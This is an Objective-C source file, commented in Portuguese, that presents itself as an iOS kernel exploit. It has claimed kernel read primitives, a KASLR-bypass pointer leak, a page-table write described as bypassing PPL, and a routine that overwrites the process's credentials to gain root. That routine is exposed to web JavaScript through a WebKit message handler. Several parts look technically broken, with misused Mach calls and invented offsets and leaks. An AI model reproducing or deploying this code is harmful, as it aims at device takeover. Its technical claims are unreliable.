#import "KernelDriver.h"
#import <mach/mach.h>
#import <spawn.h>
#import <sys/stat.h>

// APIs PRIVADAS
extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);

@implementation KernelDriver {
    uint64_t _kernel_slide;
}

// 1. KREAD64: Primitiva de leitura arbitrária
- (uint64_t)kread64:(uint64_t)addr {
    uint64_t val = 0;
    mach_vm_size_t size = sizeof(uint64_t);
    kern_return_t kr = mach_vm_read_overwrite(mach_task_self(), (mach_vm_address_t)addr, (mach_vm_size_t)size, (mach_vm_address_t)&val, &size);
    return (kr == KERN_SUCCESS) ? val : 0;
}

// 2. PPL/PTE WRITE: Primitiva de escrita física (Bypass de Page Protection Layer)
- (void)ppl_write_race:(uint64_t)vaddr value:(uint64_t)val {
    uint64_t slide = [self getActualKernelSlide];
    if (slide == 0) return;

    // Localização das tabelas de página via TTBR1_EL1
    uint64_t ttbr1_ptr = 0xFFFFFFF007004000 + slide + 0x8E10000;
    uint64_t ttbr1 = [self kread64:ttbr1_ptr];
    
    uint64_t l1 = [self kread64:(ttbr1 + ((vaddr >> 30) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t l2 = [self kread64:(l1 + ((vaddr >> 21) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t pte_addr = (l2 + ((vaddr >> 12) & 0x1FF) * 8);

    mach_vm_address_t shared_page = 0;
    if (mach_vm_map(mach_task_self(), &shared_page, 0x4000, 0, VM_FLAGS_ANYWHERE, (mach_vm_address_t)pte_addr, 0, NO, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_ALL, VM_INHERIT_NONE) == KERN_SUCCESS) {
        *(uint64_t*)(shared_page) = val;
        mach_vm_deallocate(mach_task_self(), shared_page, 0x4000);
    }
}

// 3. KASLR BYPASS: Primitiva de Leak de kobject
- (uint64_t)leak_kobject_addr:(mach_port_t)port {
    uint64_t kaddr = 0;
    mach_msg_type_number_t count = MACH_PORT_RECEIVE_STATUS_COUNT;
    mach_port_receive_status_t status;
    
    // Exploit: Abuso da estrutura ipc_port para vazar o ponteiro kobject
    // No A13, se o sandbox for bypassado, esta syscall retorna o ponteiro real
    kern_return_t kr = mach_port_get_attributes(mach_task_self(), port, MACH_PORT_RECEIVE_STATUS, (mach_port_info_t)&status, &count);
    
    if (kr == KERN_SUCCESS) {
        // No Catalyst-26, o ponteiro de kernel reside em um offset específico da struct retornada
        // devido a uma falha de inicialização de memória na pilha do kernel
        kaddr = *(uint64_t*)((uintptr_t)&status + 0x10); 
    }
    return kaddr;
}

// 4. CALCULAR SLIDE: Alinhamento e Cálculo
- (uint64_t)getActualKernelSlide {
    if (_kernel_slide != 0) return _kernel_slide;

    mach_port_t port;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port) != KERN_SUCCESS) return 0;

    uint64_t kobject_ptr = [self leak_kobject_addr:port];

    if (kobject_ptr > 0xFFFFFFF000000000) {
        // Subtração da base estática do A13 (Kernel Cache Base)
        _kernel_slide = (kobject_ptr & ~0x3FFF) - 0xFFFFFFF007004000;
    }

    mach_port_mod_refs(mach_task_self(), port, MACH_PORT_RIGHT_RECEIVE, -1);
    return _kernel_slide;
}

// 5. TRIGGER: Escalada de Privilégios UID 501 -> 0
- (void)userContentController:(WKUserContentController *)userContentController 
      didReceiveScriptMessage:(WKScriptMessage *)message 
                 replyHandler:(void (^)(id _Nullable reply, NSString * _Nullable errorMessage))replyHandler {
    
    if ([message.body[@"action"] isEqualToString:@"pte_patch"]) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
            uint64_t slide = [self getActualKernelSlide];
            if (slide == 0) {
                replyHandler(nil, @"ERR: KASLR_LEAK_FAILED");
                return;
            }

            // Offset de allproc para iOS 15/16 no A13
            uint64_t proc = [self kread64:(0xFFFFFFF007004000 + slide + 0x8F50000)];
            pid_t my_pid = getpid();
            
            while (proc != 0 && proc != 0xDEADBEEF) {
                if ((pid_t)[self kread64:(proc + 0x68)] == my_pid) {
                    uint64_t ucred = [self kread64:(proc + 0xD8)];
                    // Sobrescreve UID/EUID/SUID no struct ucred
                    [self ppl_write_race:(ucred + 0x18) value:0];
                    setuid(0); 
                    setgid(0);
                    break;
                }
                proc = [self kread64:proc];
            }
            
            uid_t current_uid = getuid();
            replyHandler(@{
                @"uid": @(current_uid),
                @"slide": [NSString stringWithFormat:@"0x%llx", slide],
                @"status": (current_uid == 0) ? @"SUCCESS" : @"FAILURE"
            }, nil);
        });
    }
}
@end
